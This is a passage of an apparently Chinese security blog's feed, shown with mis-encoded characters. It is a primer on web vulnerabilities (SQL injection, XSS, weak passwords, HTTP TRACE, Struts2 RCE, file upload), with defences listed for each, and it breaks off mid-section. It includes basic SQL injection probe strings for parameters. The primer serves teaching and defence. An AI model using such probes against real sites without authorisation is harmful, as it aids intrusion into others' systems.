href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javaå®‰å…¨</tag>
      
      <tag>å†…å­˜é©¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webæ¼æ´é¶åœºç»ƒä¹ (ä¸å®šæ—¶æ›´æ–°)</title>
    <link href="/2025/11/02/web%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/11/02/web%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†æ¼æ´"><a href="#åˆè¯†æ¼æ´" class="headerlink" title="åˆè¯†æ¼æ´"></a>åˆè¯†æ¼æ´</h1><h2 id="ä¸€ã€SQLæ³¨å…¥æ¼æ´"><a href="#ä¸€ã€SQLæ³¨å…¥æ¼æ´" class="headerlink" title="ä¸€ã€SQLæ³¨å…¥æ¼æ´"></a>ä¸€ã€SQLæ³¨å…¥æ¼æ´</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501">SQLæ³¨å…¥å®æˆ˜æŒ‡å—-CSDNåšå®¢</a></p><p>SQLæ³¨å…¥æ”»å‡»ï¼ˆSQL Injectionï¼‰</p><p>SQLæ³¨å…¥åŸç†ï¼š</p><p>SQLæ³¨å…¥å³æ˜¯æŒ‡webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºä¸­äº‹å…ˆå®šä¹‰å¥½çš„æŸ¥è¯¢è¯­å¥çš„ç»“å°¾ä¸Šæ·»åŠ é¢å¤–çš„SQLè¯­å¥ï¼Œåœ¨ç®¡ç†å‘˜ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®ç°éæ³•æ“ä½œï¼Œä»¥æ­¤æ¥å®ç°æ¬ºéª—æ•°æ®åº“æœåŠ¡å™¨æ‰§è¡Œéæˆæƒçš„ä»»æ„æŸ¥è¯¢ï¼Œä»è€Œè¿›ä¸€æ­¥å¾—åˆ°ç›¸åº”çš„æ•°æ®ä¿¡æ¯ã€‚</p><p>SQLæ³¨å…¥ç‚¹åˆ¤æ–­<br>1.<code>?id=1 and 1=1 </code>å’Œ<code>?id=1 and 1=2</code>è¿›è¡Œæµ‹è¯•å¦‚æœ1&#x3D;1é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”1&#x3D;2é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=1 and 1=2<br></code></pre></td></tr></table></figure><p>2.<code>?id=1&#39; and 1=1--+/#</code>å’Œ<code>?id=1&#39; and 1=2--+/#</code>è¿›è¡Œæµ‹è¯•å¦‚æœ1&#x3D;1é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”1&#x3D;2é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2-- &#x27;<br></code></pre></td></tr></table></figure><p>3.<code>?id=1&#39;and 1=1 and &#39;1&#39;=&#39;1</code>å’Œ<code>?id=1&#39;and 1=1 and &#39;1&#39;=&#39;1</code>è¿›è¡Œæµ‹è¯•å¦‚æœ1&#x3D;1é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”1&#x3D;2é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 and &#x27;1&#x27;=&#x27;1&#x27;<br></code></pre></td></tr></table></figure><p>4.<code>?id=1%&#39; and 1=1 and &#39;%&#39;=&#39;%</code>å’Œ<code>?id=1%&#39; and 1=2 and &#39;%&#39;=&#39;%</code>è¿›è¡Œæµ‹è¯•å¦‚æœ1&#x3D;1é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”1&#x3D;2é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºæœç´¢å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * from table where users like &#x27;%1 %&#x27; and &#x27;1&#x27;=&#x27;1&#x27; and &#x27;%&#x27;=&#x27;%&#x27;<br></code></pre></td></tr></table></figure><p>5.<code>?id=1%&#39; and 1=1--+/#</code>å’Œ<code>?id=1%&#39; and 1=2--+/#</code>è¿›è¡Œæµ‹è¯•å¦‚æœ1&#x3D;1é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”1&#x3D;2é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºæœç´¢å‹æ³¨å…¥ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒSQLæ³¨å…¥çš„ä½ç½®åŒ…æ‹¬ï¼š<br>ï¼ˆ1ï¼‰è¡¨å•æäº¤ï¼Œä¸»è¦æ˜¯POSTè¯·æ±‚ï¼Œä¹ŸåŒ…æ‹¬GETè¯·æ±‚ï¼›<br>ï¼ˆ2ï¼‰URLå‚æ•°æäº¤ï¼Œä¸»è¦ä¸ºGETè¯·æ±‚å‚æ•°ï¼›<br>ï¼ˆ3ï¼‰Cookieå‚æ•°æäº¤ï¼›<br>ï¼ˆ4ï¼‰HTTPè¯·æ±‚å¤´éƒ¨çš„ä¸€äº›å¯ä¿®æ”¹çš„å€¼ï¼Œæ¯”å¦‚Refererã€User_Agentç­‰ï¼›<br>ï¼ˆ5ï¼‰ä¸€äº›è¾¹ç¼˜çš„è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚.mp3æ–‡ä»¶çš„ä¸€äº›æ–‡ä»¶ä¿¡æ¯ç­‰ã€‚<br>å¸¸è§çš„é˜²èŒƒæ–¹æ³•<br>ï¼ˆ1ï¼‰æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°SQLè¯­å¥ä¸­ã€‚å½“å‰å‡ ä¹æ‰€æœ‰çš„æ•°æ®åº“ç³»ç»Ÿéƒ½æä¾›äº†å‚æ•°åŒ–SQLè¯­å¥æ‰§è¡Œæ¥å£ï¼Œä½¿ç”¨æ­¤æ¥å£å¯ä»¥éå¸¸æœ‰æ•ˆçš„é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚<br>ï¼ˆ2ï¼‰å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆâ€™â€&lt;&gt;&amp;*;ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚<br>ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»å‹ï¼Œæ¯”å¦‚æ•°å­—å‹çš„æ•°æ®å°±å¿…é¡»æ˜¯æ•°å­—ï¼Œæ•°æ®åº“ä¸­çš„å­˜å‚¨å­—æ®µå¿…é¡»å¯¹åº”ä¸ºintå‹ã€‚<br>ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šï¼Œèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢æ¯”è¾ƒé•¿çš„SQLæ³¨å…¥è¯­å¥æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚<br>ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œå»ºè®®å…¨éƒ¨ä½¿ç”¨UTF-8ç¼–ç ï¼Œä¸Šä¸‹å±‚ç¼–ç ä¸ä¸€è‡´æœ‰å¯èƒ½å¯¼è‡´ä¸€äº›è¿‡æ»¤æ¨¡å‹è¢«ç»•è¿‡ã€‚<br>ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æƒé™ï¼Œä»è€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚<br>ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤ºSQLé”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»å‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡Œä¸€äº›åˆ¤æ–­ã€‚<br>ï¼ˆ8ï¼‰åœ¨ç½‘ç«™å‘å¸ƒä¹‹å‰å»ºè®®ä½¿ç”¨ä¸€äº›ä¸“ä¸šçš„SQLæ³¨å…¥æ£€æµ‹å·¥å…·è¿›è¡Œæ£€æµ‹ï¼ŒåŠæ—¶ä¿®è¡¥è¿™äº›SQLæ³¨å…¥æ¼æ´ã€‚</p><h2 id="äºŒã€è·¨ç«™è„šæœ¬æ¼æ´-XSS"><a href="#äºŒã€è·¨ç«™è„šæœ¬æ¼æ´-XSS" class="headerlink" title="äºŒã€è·¨ç«™è„šæœ¬æ¼æ´-XSS"></a>äºŒã€è·¨ç«™è„šæœ¬æ¼æ´-XSS</h2><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºXSSï¼‰å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œå¯è¢«ç”¨äºè¿›è¡Œçªƒå–éšç§ã€é’“é±¼æ¬ºéª—ã€çªƒå–å¯†ç ã€ä¼ æ’­æ¶æ„ä»£ç ç­‰æ”»å‡»ã€‚<br>XSSæ”»å‡»ä½¿ç”¨åˆ°çš„æŠ€æœ¯ä¸»è¦ä¸ºHTMLå’ŒJavascriptï¼Œä¹ŸåŒ…æ‹¬VBScriptå’ŒActionScriptç­‰ã€‚XSSæ”»å‡»å¯¹WEBæœåŠ¡å™¨è™½æ— ç›´æ¥å±å®³ï¼Œä½†æ˜¯å®ƒå€ŸåŠ©ç½‘ç«™è¿›è¡Œä¼ æ’­ï¼Œä½¿ç½‘ç«™çš„ä½¿ç”¨ç”¨æˆ·å—åˆ°æ”»å‡»ï¼Œå¯¼è‡´ç½‘ç«™ç”¨æˆ·å¸å·è¢«çªƒå–ï¼Œä»è€Œå¯¹ç½‘ç«™ä¹Ÿäº§ç”Ÿäº†è¾ƒä¸¥é‡çš„å±å®³ã€‚<br>XSSç±»å‹åŒ…æ‹¬ï¼š<br>ï¼ˆ1ï¼‰éæŒä¹…å‹è·¨ç«™ï¼šå³åå°„å‹è·¨ç«™è„šæœ¬æ¼æ´ï¼Œæ˜¯ç›®å‰æœ€æ™®éçš„è·¨ç«™ç±»å‹ã€‚è·¨ç«™ä»£ç ä¸€èˆ¬å­˜åœ¨äºé“¾æ¥ä¸­ï¼Œè¯·æ±‚è¿™æ ·çš„é“¾æ¥æ—¶ï¼Œè·¨ç«™ä»£ç ç»è¿‡æœåŠ¡ç«¯åå°„å›æ¥ï¼Œè¿™ç±»è·¨ç«™çš„ä»£ç ä¸å­˜å‚¨åˆ°æœåŠ¡ç«¯ï¼ˆæ¯”å¦‚æ•°æ®åº“ä¸­ï¼‰ã€‚ä¸Šé¢ç« èŠ‚æ‰€ä¸¾çš„ä¾‹å­å°±æ˜¯è¿™ç±»æƒ…å†µã€‚<br>ï¼ˆ2ï¼‰æŒä¹…å‹è·¨ç«™ï¼šè¿™æ˜¯å±å®³æœ€ç›´æ¥çš„è·¨ç«™ç±»å‹ï¼Œè·¨ç«™ä»£ç å­˜å‚¨äºæœåŠ¡ç«¯ï¼ˆæ¯”å¦‚æ•°æ®åº“ä¸­ï¼‰ã€‚å¸¸è§æƒ…å†µæ˜¯æŸç”¨æˆ·åœ¨è®ºå›å‘è´´ï¼Œå¦‚æœè®ºå›æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„Javascriptä»£ç æ•°æ®ï¼Œå°±ä¼šå¯¼è‡´å…¶ä»–æµè§ˆæ­¤è´´çš„ç”¨æˆ·çš„æµè§ˆå™¨ä¼šæ‰§è¡Œå‘è´´äººæ‰€åµŒå…¥çš„Javascriptä»£ç ã€‚<br>ï¼ˆ3ï¼‰DOMè·¨ç«™ï¼ˆDOM XSSï¼‰ï¼šæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å®¢æˆ·ç«¯DOMï¼ˆDocument Object Modelæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ä¸­çš„è·¨ç«™æ¼æ´ï¼Œå¾ˆå¤§åŸå› æ˜¯å› ä¸ºå®¢æˆ·ç«¯è„šæœ¬å¤„ç†é€»è¾‘å¯¼è‡´çš„å®‰å…¨é—®é¢˜ã€‚<br>å¸¸ç”¨çš„é˜²æ­¢XSSæŠ€æœ¯åŒ…æ‹¬ï¼š<br>ï¼ˆ1ï¼‰ä¸SQLæ³¨å…¥é˜²æŠ¤çš„å»ºè®®ä¸€æ ·ï¼Œå‡å®šæ‰€æœ‰è¾“å…¥éƒ½æ˜¯å¯ç–‘çš„ï¼Œå¿…é¡»å¯¹æ‰€æœ‰è¾“å…¥ä¸­çš„scriptã€iframeç­‰å­—æ ·è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ã€‚è¿™é‡Œçš„è¾“å…¥ä¸ä»…ä»…æ˜¯ç”¨æˆ·å¯ä»¥ç›´æ¥äº¤äº’çš„è¾“å…¥æ¥å£ï¼Œä¹ŸåŒ…æ‹¬HTTPè¯·æ±‚ä¸­çš„Cookieä¸­çš„å˜é‡ï¼ŒHTTPè¯·æ±‚å¤´éƒ¨ä¸­çš„å˜é‡ç­‰ã€‚<br>ï¼ˆ2ï¼‰ä¸ä»…è¦éªŒè¯æ•°æ®çš„ç±»å‹ï¼Œè¿˜è¦éªŒè¯å…¶æ ¼å¼ã€é•¿åº¦ã€èŒƒå›´å’Œå†…å®¹ã€‚<br>ï¼ˆ3ï¼‰ä¸è¦ä»…ä»…åœ¨å®¢æˆ·ç«¯åšæ•°æ®çš„éªŒè¯ä¸è¿‡æ»¤ï¼Œå…³é”®çš„è¿‡æ»¤æ­¥éª¤åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚<br>ï¼ˆ4ï¼‰å¯¹è¾“å‡ºçš„æ•°æ®ä¹Ÿè¦æ£€æŸ¥ï¼Œæ•°æ®åº“é‡Œçš„å€¼æœ‰å¯èƒ½ä¼šåœ¨ä¸€ä¸ªå¤§ç½‘ç«™çš„å¤šå¤„éƒ½æœ‰è¾“å‡ºï¼Œå³ä½¿åœ¨è¾“å…¥åšäº†ç¼–ç ç­‰æ“ä½œï¼Œåœ¨å„å¤„çš„è¾“å‡ºç‚¹æ—¶ä¹Ÿè¦è¿›è¡Œå®‰å…¨æ£€æŸ¥ã€‚<br>ï¼ˆ5ï¼‰åœ¨å‘å¸ƒåº”ç”¨ç¨‹åºä¹‹å‰æµ‹è¯•æ‰€æœ‰å·²çŸ¥çš„å¨èƒã€‚</p><h2 id="ä¸‰ã€å¼±å£ä»¤æ¼æ´"><a href="#ä¸‰ã€å¼±å£ä»¤æ¼æ´" class="headerlink" title="ä¸‰ã€å¼±å£ä»¤æ¼æ´"></a>ä¸‰ã€å¼±å£ä»¤æ¼æ´</h2><p>å¼±å£ä»¤(weak password) æ²¡æœ‰ä¸¥æ ¼å’Œå‡†ç¡®çš„å®šä¹‰ï¼Œé€šå¸¸è®¤ä¸ºå®¹æ˜“è¢«åˆ«äººï¼ˆä»–ä»¬æœ‰å¯èƒ½å¯¹ä½ å¾ˆäº†è§£ï¼‰çŒœæµ‹åˆ°æˆ–è¢«ç ´è§£å·¥å…·ç ´è§£çš„å£ä»¤å‡ä¸ºå¼±å£ä»¤ã€‚</p><p>è®¾ç½®å¯†ç é€šå¸¸éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š<br>ï¼ˆ1ï¼‰ä¸ä½¿ç”¨ç©ºå£ä»¤æˆ–ç³»ç»Ÿç¼ºçœçš„å£ä»¤ï¼Œè¿™äº›å£ä»¤ä¼—æ‰€å‘¨ä¹‹ï¼Œä¸ºå…¸å‹çš„å¼±å£ä»¤ã€‚<br>ï¼ˆ2ï¼‰å£ä»¤é•¿åº¦ä¸å°äº8ä¸ªå­—ç¬¦ã€‚<br>ï¼ˆ3ï¼‰å£ä»¤ä¸åº”è¯¥ä¸ºè¿ç»­çš„æŸä¸ªå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼šAAAAAAAAï¼‰æˆ–é‡å¤æŸäº›å­—ç¬¦çš„ç»„åˆï¼ˆä¾‹å¦‚ï¼štzf.tzf.ï¼‰ã€‚<br>ï¼ˆ4ï¼‰å£ä»¤åº”è¯¥ä¸ºä»¥ä¸‹å››ç±»å­—ç¬¦çš„ç»„åˆï¼Œå¤§å†™å­—æ¯(A-Z)ã€å°å†™å­—æ¯(a-z)ã€æ•°å­—(0-9)å’Œç‰¹æ®Šå­—ç¬¦ã€‚æ¯ç±»å­—ç¬¦è‡³å°‘åŒ…å«ä¸€ä¸ªã€‚å¦‚æœæŸç±»å­—ç¬¦åªåŒ…å«ä¸€ä¸ªï¼Œé‚£ä¹ˆè¯¥å­—ç¬¦ä¸åº”ä¸ºé¦–å­—ç¬¦æˆ–å°¾å­—ç¬¦ã€‚<br>ï¼ˆ5ï¼‰å£ä»¤ä¸­ä¸åº”åŒ…å«æœ¬äººã€çˆ¶æ¯ã€å­å¥³å’Œé…å¶çš„å§“åå’Œå‡ºç”Ÿæ—¥æœŸã€çºªå¿µæ—¥æœŸã€ç™»å½•åã€E-mailåœ°å€ç­‰ç­‰ä¸æœ¬äººæœ‰å…³çš„ä¿¡æ¯ï¼Œä»¥åŠå­—å…¸ä¸­çš„å•è¯ã€‚<br>ï¼ˆ6ï¼‰å£ä»¤ä¸åº”è¯¥ä¸ºç”¨æ•°å­—æˆ–ç¬¦å·ä»£æ›¿æŸäº›å­—æ¯çš„å•è¯ã€‚<br>ï¼ˆ7ï¼‰å£ä»¤åº”è¯¥æ˜“è®°ä¸”å¯ä»¥å¿«é€Ÿè¾“å…¥ï¼Œé˜²æ­¢ä»–äººä»ä½ èº«åå¾ˆå®¹æ˜“çœ‹åˆ°ä½ çš„è¾“å…¥ã€‚<br>ï¼ˆ8ï¼‰è‡³å°‘90å¤©å†…æ›´æ¢ä¸€æ¬¡å£ä»¤ï¼Œé˜²æ­¢æœªè¢«å‘ç°çš„å…¥ä¾µè€…ç»§ç»­ä½¿ç”¨è¯¥å£ä»¤ã€‚</p><h2 id="å››ã€HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´"><a href="#å››ã€HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´" class="headerlink" title="å››ã€HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´"></a>å››ã€HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´</h2><p>HTTP&#x2F;1.1ï¼ˆRFC2616ï¼‰è§„èŒƒå®šä¹‰äº†HTTP TRACEæ–¹æ³•ï¼Œä¸»è¦æ˜¯ç”¨äºå®¢æˆ·ç«¯é€šè¿‡å‘WebæœåŠ¡å™¨æäº¤TRACEè¯·æ±‚æ¥è¿›è¡Œæµ‹è¯•æˆ–è·å¾—è¯Šæ–­ä¿¡æ¯ã€‚å½“WebæœåŠ¡å™¨å¯ç”¨TRACEæ—¶ï¼Œæäº¤çš„è¯·æ±‚å¤´ä¼šåœ¨æœåŠ¡å™¨å“åº”çš„å†…å®¹ï¼ˆBodyï¼‰ä¸­å®Œæ•´çš„è¿”å›ï¼Œå…¶ä¸­HTTPå¤´å¾ˆå¯èƒ½åŒ…æ‹¬Session Tokenã€Cookiesæˆ–å…¶å®ƒè®¤è¯ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ¥æ¬ºéª—åˆæ³•ç”¨æˆ·å¹¶å¾—åˆ°ä»–ä»¬çš„ç§äººä¿¡æ¯ã€‚è¯¥æ¼æ´å¾€å¾€ä¸å…¶å®ƒæ–¹å¼é…åˆæ¥è¿›è¡Œæœ‰æ•ˆæ”»å‡»ï¼Œç”±äºHTTP TRACEè¯·æ±‚å¯ä»¥é€šè¿‡å®¢æˆ·æµè§ˆå™¨è„šæœ¬å‘èµ·ï¼ˆå¦‚XMLHttpRequestï¼‰ï¼Œå¹¶å¯ä»¥é€šè¿‡DOMæ¥å£æ¥è®¿é—®ï¼Œå› æ­¤å¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚<br>é˜²å¾¡HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´çš„æ–¹æ³•é€šå¸¸ç¦ç”¨HTTP TRACEæ–¹æ³•ã€‚</p><h2 id="äº”ã€Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#äº”ã€Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="äº”ã€Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>äº”ã€Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>ApacheStrutsæ˜¯ä¸€æ¬¾å»ºç«‹Java webåº”ç”¨ç¨‹åºçš„å¼€æ”¾æºä»£ç æ¶æ„ã€‚Apache Strutså­˜åœ¨ä¸€ä¸ªè¾“å…¥è¿‡æ»¤é”™è¯¯ï¼Œå¦‚æœé‡åˆ°è½¬æ¢é”™è¯¯å¯è¢«åˆ©ç”¨æ³¨å…¥å’Œæ‰§è¡Œä»»æ„Javaä»£ç ã€‚<br>ç½‘ç«™å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„å¤§éƒ¨åˆ†åŸå› æ˜¯ç”±äºç½‘ç«™é‡‡ç”¨äº†Apache Struts Xworkä½œä¸ºç½‘ç«™åº”ç”¨æ¡†æ¶ï¼Œç”±äºè¯¥è½¯ä»¶å­˜åœ¨è¿œç¨‹ä»£ç æ‰§é«˜å±æ¼æ´ï¼Œå¯¼è‡´ç½‘ç«™é¢ä¸´å®‰å…¨é£é™©ã€‚CNVDå¤„ç½®è¿‡è¯¸å¤šæ­¤ç±»æ¼æ´ï¼Œä¾‹å¦‚ï¼šâ€œGPSè½¦è½½å«æ˜Ÿå®šä½ç³»ç»Ÿâ€ç½‘ç«™å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CNVD-2012-13934)ï¼›Aspcmsç•™è¨€æœ¬è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCNVD-2012-11590ï¼‰ç­‰ã€‚<br>ä¿®å¤æ­¤ç±»æ¼æ´ï¼Œåªéœ€åˆ°Apacheå®˜ç½‘å‡çº§Apache Strutsåˆ°æœ€æ–°ç‰ˆæœ¬ï¼š<a href="http://struts.apache.org/">http://struts.apache.org</a></p><h2 id="å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸ç”±äºç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥é€ æˆçš„ï¼Œå¦‚æœæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œæ”»å‡»è€…å¯é€šè¿‡ Web è®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç½‘ç«™åé—¨æ–‡ä»¶ï¼ˆwebshellï¼‰ï¼Œè¿›è€Œè¿œç¨‹æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨ã€‚<br>å› æ­¤ï¼Œåœ¨å¼€å‘ç½‘ç«™åŠåº”ç”¨ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œéœ€ä¸¥æ ¼é™åˆ¶å’Œæ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ æ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚åŒæ—¶é™åˆ¶ç›¸å…³ç›®å½•çš„æ‰§è¡Œæƒé™ï¼Œé˜²èŒƒwebshellæ”»å‡»ã€‚</p><h2 id="ä¸ƒã€ç§æœ‰IPåœ°å€æ³„éœ²æ¼æ´"><a href="#ä¸ƒã€ç§æœ‰IPåœ°å€æ³„éœ²æ¼æ´" class="headerlink" title="ä¸ƒã€ç§æœ‰IPåœ°å€æ³„éœ²æ¼æ´"></a>ä¸ƒã€ç§æœ‰IPåœ°å€æ³„éœ²æ¼æ´</h2><p>IPåœ°å€æ˜¯ç½‘ç»œç”¨æˆ·çš„é‡è¦æ ‡ç¤ºï¼Œæ˜¯æ”»å‡»è€…è¿›è¡Œæ”»å‡»å‰éœ€è¦äº†è§£çš„ã€‚è·å–çš„æ–¹æ³•è¾ƒå¤šï¼Œæ”»å‡»è€…ä¹Ÿä¼šå› ä¸åŒçš„ç½‘ç»œæƒ…å†µé‡‡å–ä¸åŒçš„æ–¹æ³•ï¼Œå¦‚ï¼šåœ¨å±€åŸŸç½‘å†…ä½¿ç”¨PingæŒ‡ä»¤ï¼ŒPingå¯¹æ–¹åœ¨ç½‘ç»œä¸­çš„åç§°è€Œè·å¾—IPï¼›åœ¨Internetä¸Šä½¿ç”¨IPç‰ˆçš„QQç›´æ¥æ˜¾ç¤ºã€‚æœ€æœ‰æ•ˆçš„åŠæ³•æ˜¯æˆªè·å¹¶åˆ†æå¯¹æ–¹çš„ç½‘ç»œæ•°æ®åŒ…ã€‚æ”»å‡»è€…å¯ä»¥æ‰¾åˆ°å¹¶ç›´æ¥é€šè¿‡è½¯ä»¶è§£ææˆªè·åçš„æ•°æ®åŒ…çš„IPåŒ…å¤´ä¿¡æ¯ï¼Œå†æ 